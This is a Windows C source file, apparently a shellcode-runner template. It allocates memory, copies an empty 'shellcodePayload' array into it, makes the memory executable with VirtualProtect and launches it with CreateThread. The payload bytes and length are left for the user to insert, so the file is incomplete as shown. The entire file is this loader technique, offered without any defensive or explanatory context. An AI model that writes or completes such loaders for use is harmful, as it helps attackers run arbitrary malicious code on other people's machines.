#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcodePayload[] = {

};

//insert length
unsigned int lengthOfshellcodePayload = ;

int main(void) {
    
	void * alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
    DWORD oldprotect = 0;
	
	// Alloocate memory
	alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "shellcodePayload addr", (void *)shellcodePayload);
	printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)alloc_mem);

	// Copy shellcodePayload to newly allocated memory
	RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);
	
	// Change newly allocated memory with payload to readable and executale
	retval = VirtualProtect(alloc_mem, lengthOfshellcodePayload, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nPress Enter to Create Thread!\n");
	getchar();

	
	if ( retval != 0 ) {
			threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
			WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}

